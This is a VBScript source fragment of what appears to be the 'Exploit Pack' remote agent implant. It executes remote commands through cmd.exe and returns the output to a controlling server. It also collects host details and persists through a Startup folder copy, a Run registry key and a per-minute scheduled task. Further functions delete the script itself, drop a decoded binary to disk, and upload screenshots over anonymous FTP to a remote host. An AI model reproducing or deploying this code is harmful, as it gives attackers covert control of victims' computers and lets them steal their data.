		SendMagic CookieID,sendHostUrl,"Explorer Object + VBS",sendOSType,"Screenshot sent",AgentUN, GetIPAddress
	End If
	
	' Clean command because html
	run = Replace(run,"&gt;", ">")
	
	Err.Clear
	On Error Resume Next
	Set oShell = CreateObject ("WScript.Shell")
	'WScript.Echo run
	Dim objShell, strPath1
	strPath1 = "cmd.exe /c " & run & " > %appdata%\output.log"
	oShell.run strPath1,2,true	
	
	
	Set wshShell = CreateObject("WScript.Shell")

	output = wshShell.ExpandEnvironmentStrings("%APPDATA%") & "\output.log"
	Set fso = CreateObject("Scripting.FileSystemObject")
	Set f = fso.OpenTextFile(output)

	Do Until f.AtEndOfStream
	      SendMagic CookieID,sendHostUrl,"Explorer Object + VBS",sendOSType,f.ReadLine,AgentUN, GetIPAddress
	Loop

	f.Close
	
    SendMagic CookieID,sendHostUrl,"Explorer Object + VBS",sendOSType,strText,AgentUN, GetIPAddress

	If Err.Number <> 0 Then
		MsgBox Err
	End If
	SendMagic CookieID,sendHostUrl,"Explorer Object + VBS",sendOSType,"Command executed",AgentUN, GetIPAddress
	' Delete log file
	Set objFSO = CreateObject("Scripting.FileSystemObject")
	objFSO.DeleteFile(output)
End Function

Function CleanInput(HTTPGet)
	arrLines = Split(HTTPGet, "//")
    For Each strLine In arrLines
    	If InStr(strLine, "OS=") Then
			StrClean = strLine
    	End If
    Next
    arrLineFix = Split(StrClean, "</body></html>" )
    For Each strClean In arrLineFix
     	If InStr(strClean, "") Then
			arrCleanFix = strClean
	End If
    Next
    arrReturn = Split(arrCleanFix, "------------------------------------------------------------" )
    For Each strReturn In arrReturn
     	If InStr(strReturn, "") Then
			StrFinalFix = strReturn		
	End If
    Next
    arrFinalFix = Split(StrFinalFix, "OS=" )
    For Each strFinal In arrFinalFix
     	If InStr(strFinal, "") Then
			FinalFix = strFinal		
	End If
    Next
   arrFinalFixDelimiter = Split(FinalFix, "*_*" )
    For Each strDelimiter In arrFinalFixDelimiter
     	If InStr(strDelimiter, "") Then
			Output = strDelimiter		
	End If
    Next
    CleanInput = Output
End Function

' Get local IP address 
Function GetIPAddress()
	On Error Resume Next
	strComputer = "."
	Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\CIMV2")
	Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration")

	For Each objItem In colItems
	For Each objValue In objItem.IPAddress
	If objValue <> "" Then
		GetIPAddress = objValue
		Exit for
	End If
	Next 	
	Next
End Function

'Self destruct this agent
Function SelfDestruct()
	Set objFSO = CreateObject( "Scripting.FileSystemObject" )
	objFSO.DeleteFile WScript.ScriptFullName
	WScript.Quit
End Function


Function Installer()
	Const INSTALL_LOCATION = "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
	Const RUN_AFTER_INSTALL = True
	If ScriptLocation <> GetInstallLocation Then
		InstallScript RUN_AFTER_INSTALL
	End If 
End Function
Function Persistence()
	const HKEY_LOCAL_MACHINE = &H80000001
	strComputer = "."
	Set objReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\"&_ 
		strComputer & "\root\default:StdRegProv")

	strKeyPath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run\"
	KeyPath = "Software\Microsoft\Windows\CurrentVersion\Run\"
	strValueName = "ExploitPack"
	strValue = "%WINDIR%\system32\wscript.exe ""%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\exploitpack.vbs"" ""%1"" %*"


	Return = objReg.CreateKey(HKEY_LOCAL_MACHINE, KeyPath)
	If (Return = 0) And (Err.Number = 0) Then   

		' Write string value to key    
		Return = objReg.SetExpandedStringValue( _
			HKEY_LOCAL_MACHINE,strKeyPath,strValueName,strValue)
	End If
End Function

' Get OS version
Function GetOS()
	Dim objWMI
	Set objWMI=GetObject("winmgmts://" & "." ).InstancesOf("win32_operatingsystem")
	For Each OS In objWMI
	  GetOS=OS.Caption
	Next
End Function

'Install the script
Sub InstallScript(p_bRunAfterInstall)
    'Initialise
    Dim objFSO, objShell
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    Set objShell = Wscript.CreateObject("WScript.Shell")
     
    'If the install directory does not exist, create it (using a call out to the DOS command MKDIR
    If Not objFSO.FolderExists(GetInstallLocation) Then ExecCmd "mkdir """ & GetInstallLocation & """"
 
    'Copy the new script file into the install directory
    objFSO.CopyFile WScript.ScriptFullName, GetInstallLocation, true
     
    'Give the OS some time to copy if it is a bit laggy - seen occasional issues here
    Dim intCounter
    Const WAIT_MS = 100
    Const MAXTIME_MS = 4000
    intCounter = 0
    Do While Not(objFSO.FileExists(InstalledScriptPath) OR  intCounter > (MAXTIME_MS/WAIT_MS))
        WScript.Sleep WAIT_MS
        intCounter = intCounter + 1
    Loop
    'If the script wasn't copied output an error message, otherwise run if required.
    If objFSO.FileExists(InstalledScriptPath) Then
        If p_bRunAfterInstall then objShell.Run """" & InstalledScriptPath & """"
        SelfDestruct
    Else
        MsgBox "Installation timed out.", vbCritical, "Installation"
    End If
End Sub
 
 
'Execute a DOS command
Sub ExecCmd(p_strDOSCmd)
    Dim objCommand
    Set objCommand = New clsDOSCommandExecutor
  
    objCommand.ExecuteCommand(p_strDOSCmd)
End Sub
 
 
'Return the directory the script is in
Function ScriptLocation()
    ScriptLocation = Replace(WScript.ScriptFullName, WScript.ScriptName, "")
End Function
 
 
'Return the full path to the installed script
Function InstalledScriptPath()
    InstalledScriptPath = GetInstallLocation & WScript.ScriptName
End Function
 
 
'Return the installation directory with environment variables expanded
Function GetInstallLocation()
    GetInstallLocation = SubstituteEnvironmentVariables(INSTALL_LOCATION)
End Function
 
 
'Replace environment variables in a string (delimited by %'s) with the expanded values
Function SubstituteEnvironmentVariables(p_strInput)
    Dim objShell
    Dim astrInput, intItem
    Set objShell = Wscript.CreateObject("WScript.Shell")
     
    'Tokenise the input on percentages and initialise the return string
    astrInput = Split(p_strInput, "%")
    SubstituteEnvironmentVariables = ""
     
    'Work through the elements and carry out any substitutions
    For intItem = 0 to (UBound(astrInput))
        'If we're on an odd item it must be an environment variable
        If IsOdd(intItem) Then
            'Expand the environment variable
            SubstituteEnvironmentVariables = SubstituteEnvironmentVariables & objShell.ExpandEnvironmentStrings("%" & astrInput(intItem) & "%")
        Else
            SubstituteEnvironmentVariables = SubstituteEnvironmentVariables & astrInput(intItem)
        End If
    next
End Function
 
'Determine if a number is odd
Function IsOdd(p_intValue)
    'Set default
    IsOdd = false
     
    'Now check if there's a remainder from modulo 2
    If p_intValue mod 2 = 1 Then IsOdd = true
End Function
 
Class clsDOSCommandExecutor
    Dim objShell, objExec
    Dim strCommand
    Dim strError
    Dim objError
    Dim objOutput
    Dim strOutput
  
    Sub ExecuteCommand(p_strCommand)
        strCommand = "cmd /E:ON /c " & p_strCommand
        Set objShell = CreateObject("Wscript.Shell" )
  
        objShell.Exec(strCommand)
  
        Set objExec = objShell.Exec(strCommand)
  
        Do Until objExec.Status
            Wscript.Sleep 200
        Loop
  
        Set objError = objExec.StdErr
        strError = objError.ReadAll
  
        Set objOutput = objExec.stdOut
        strOutput = objOutput.ReadAll
    End Sub
  
    Function GetOutput()
        GetOutput = strOutput
    End Function
  
    Function GetError()
        GetError = strError
    End Function
  
    Function Failed()
        If strError = "" Then
            Failed = false
        Else
            Failed = true
        End If
    End Function
End Class

Function CreateTask()
	' A constant that specifies a daily trigger.
	const TriggerTypeDaily = 2
	' A constant that specifies an executable action.
	const ActionTypeExec = 0

	' Create the TaskService object.
	Set service = CreateObject("Schedule.Service")
	call service.Connect()

	' Get a folder to create a task definition in. 
	Dim rootFolder
	Set rootFolder = service.GetFolder("\")

	' The taskDefinition variable is the TaskDefinition object.
	Dim taskDefinition
	' The flags parameter is 0 because it is not supported.
	Set taskDefinition = service.NewTask(0) 

	' Set the registration info for the task by 
	' creating the RegistrationInfo object.
	Dim regInfo
	Set regInfo = taskDefinition.RegistrationInfo
	regInfo.Description = "Start Exploit Pack Remote Agent"
	regInfo.Author = "Juan Sacco"

	' Set the task setting info for the Task Scheduler by
	' creating a TaskSettings object.
	Dim settings
	Set settings = taskDefinition.Settings
	settings.Enabled = True
	settings.StartWhenAvailable = True
	settings.Hidden = False

	' Create a daily trigger. Note that the start boundary 
	' specifies the time of day that the task starts and the 
	' interval specifies what days the task is run.
	Dim triggers
	Set triggers = taskDefinition.Triggers

	Dim trigger
	Set trigger = triggers.Create(TriggerTypeDaily)

	' Trigger variables that define when the trigger is active 
	' and the time of day that the task is run. The format of 
	' this time is YYYY-MM-DDTHH:MM:SS
	Dim startTime, endTime

	Dim time
	time = DateAdd("s", 10, Now)  'start time = 10 seconds from now
	startTime = XmlTime(time)
	endTime = "2029-12-01T08:00:00" 'end date Terminator - Skynet arrives

	trigger.StartBoundary = startTime
	trigger.EndBoundary = endTime
	trigger.DaysInterval = 1    'Task runs every day.
	trigger.Id = "DailyTriggerId"
	trigger.Enabled = True

	' Set the task repetition pattern for the task.
	' This will repeat the task every 1 minute indefinitely
	Dim repetitionPattern
	Set repetitionPattern = trigger.Repetition
	repetitionPattern.Interval = "PT1M"

	' Create the action for the task to execute.

	' Add an action to the task to run notepad.exe.
	Dim Action
	Set Action = taskDefinition.Actions.Create( ActionTypeExec )
	Action.Path = "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\exploitpack.vbs"
	
	' Register (create) the task.
	call rootFolder.RegisterTaskDefinition( _
		"Exploit Pack - Agent", taskDefinition, 6, , , 3)
End Function

Function XmlTime(t)
    Dim cSecond, cMinute, CHour, cDay, cMonth, cYear
    Dim tTime, tDate

    cSecond = "0" & Second(t)
    cMinute = "0" & Minute(t)
    cHour = "0" & Hour(t)
    cDay = "0" & Day(t)
    cMonth = "0" & Month(t)
    cYear = Year(t)

    tTime = Right(cHour, 2) & ":" & Right(cMinute, 2) & _
        ":" & Right(cSecond, 2)
    tDate = cYear & "-" & Right(cMonth, 2) & "-" & Right(cDay, 2)
    XmlTime = tDate & "T" & tTime 
End Function

private function binaryDump(file)  
  Dim base64Encoded, base64Decoded, outByteArray, outFile
  outFile = "new_" & "exploitpack.exe"
  ' base64Encoded contains CMD.exe ( 32bits ) ( replace it with your own binary! )
  base64Encoded = file
  base64Decoded = decodeBase64(base64Encoded)
  writeBytes outFile, base64Decoded
End function


Function Base64Decode(ByVal base64String)
  'rfc1521
  '1999 Antonin Foller, Motobit Software, http://Motobit.cz
  Const Base64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  Dim dataLength, sOut, groupBegin
  
  'remove white spaces, If any
  base64String = Replace(base64String, vbCrLf, "")
  base64String = Replace(base64String, vbTab, "")
  base64String = Replace(base64String, " ", "")
  
  'The source must consists from groups with Len of 4 chars
  dataLength = Len(base64String)
  If dataLength Mod 4 <> 0 Then
    Err.Raise 1, "Base64Decode", "Bad Base64 string."
    Exit Function
  End If

  
  ' Now decode each group:
  For groupBegin = 1 To dataLength Step 4
    Dim numDataBytes, CharCounter, thisChar, thisData, nGroup, pOut
    ' Each data group encodes up To 3 actual bytes.
    numDataBytes = 3
    nGroup = 0

    For CharCounter = 0 To 3
      ' Convert each character into 6 bits of data, And add it To
      ' an integer For temporary storage.  If a character is a '=', there
      ' is one fewer data byte.  (There can only be a maximum of 2 '=' In
      ' the whole string.)

      thisChar = Mid(base64String, groupBegin + CharCounter, 1)

      If thisChar = "=" Then
        numDataBytes = numDataBytes - 1
        thisData = 0
      Else
        thisData = InStr(1, Base64, thisChar, vbBinaryCompare) - 1
      End If
      If thisData = -1 Then
        Err.Raise 2, "Base64Decode", "Bad character In Base64 string."
        Exit Function
      End If

      nGroup = 64 * nGroup + thisData
    Next
    
    'Hex splits the long To 6 groups with 4 bits
    nGroup = Hex(nGroup)
    
    'Add leading zeros
    nGroup = String(6 - Len(nGroup), "0") & nGroup
    
    'Convert the 3 byte hex integer (6 chars) To 3 characters
    pOut = Chr(CByte("&H" & Mid(nGroup, 1, 2))) + _
      Chr(CByte("&H" & Mid(nGroup, 3, 2))) + _
      Chr(CByte("&H" & Mid(nGroup, 5, 2)))
    
    'add numDataBytes characters To out string
    sOut = sOut & Left(pOut, numDataBytes)
  Next

  Base64Decode = sOut
End Function


Function Base64Encode(ByVal sText, ByVal fAsUtf16LE)

    ' Use an aux. XML document with a Base64-encoded element.
    ' Assigning the byte stream (array) returned by StrToBytes() to .NodeTypedValue
    ' automatically performs Base64-encoding, whose result can then be accessed
    ' as the element's text.
    With CreateObject("Msxml2.DOMDocument").CreateElement("aux")
        .DataType = "bin.base64"
        if fAsUtf16LE then
            .NodeTypedValue = StrToBytes(sText, "utf-16le", 2)
        else
            .NodeTypedValue = StrToBytes(sText, "utf-8", 3)
        end if
        Base64Encode = .Text
    End With

End Function

function StrToBytes(ByVal sText, ByVal sTextEncoding, ByVal iBomByteCount)

    ' Create a text string with the specified encoding and then
    ' get its binary (byte array) representation.
    With CreateObject("ADODB.Stream")
        ' Create a stream with the specified text encoding...
        .Type = 2  ' adTypeText
        .Charset = sTextEncoding
        .Open
        .WriteText sText
        ' ... and convert it to a binary stream to get a byte-array 
        ' representation.
        .Position = 0 
        .Type = 1  ' adTypeBinary
        .Position = iBomByteCount ' skip the BOM
        StrToBytes = .Read
        .Close
    End With 

end function

function BytesToStr(ByVal byteArray, ByVal sTextEncoding)

    If LCase(sTextEncoding) = "utf-16le" then
        ' UTF-16 LE happens to be VBScript's internal encoding, so we can
        ' take a shortcut and use CStr() to directly convert the byte array
        ' to a string.
        BytesToStr = CStr(byteArray)
    Else ' Convert the specified text encoding to a VBScript string.
        ' Create a binary stream and copy the input byte array to it.
        With CreateObject("ADODB.Stream")
            .Type = 1 ' adTypeBinary
            .Open
            .Write byteArray
            ' Now change the type to text, set the encoding, and output the 
            ' result as text.
            .Position = 0
            .Type = 2 ' adTypeText
            .CharSet = sTextEncoding
            BytesToStr = .ReadText
            .Close
        End With
    End If

end function

Function SendFile()
	outputFile = "screenshot.exe screen.png"
	strPath1 = "cmd.exe /c " & outputFile
	oShell.run strPath1,2, true	
	WScript.Sleep 2000
	' Upload Files to FTP Server
	username="anonymous"
	Set fso = CreateObject("Scripting.Filesystemobject")
	Set file = fso.CreateTextFile("ftp.txt",1)
	file.WriteLine "open " & hostname & " 2121"
	file.WriteLine username
	file.WriteLine "Binary"
	file.WriteLine "put screen.png"
	file.WriteLine "bye"
	file.Close
	Set WshShell = CreateObject("wscript.Shell")
	WshShell.Run "cmd.exe /c start /min ftp.exe -s:ftp.txt",1,True
End Function

private Sub writeBytes(file, bytes)
	  Dim binaryStream
	  Set binaryStream = CreateObject("ADODB.Stream")
	  binaryStream.Type = 1
	  'Open the stream and write binary data
	  binaryStream.Open
	  binaryStream.Write bytes
	  'Save binary data to disk
	  binaryStream.SaveToFile file, 2
End Sub 
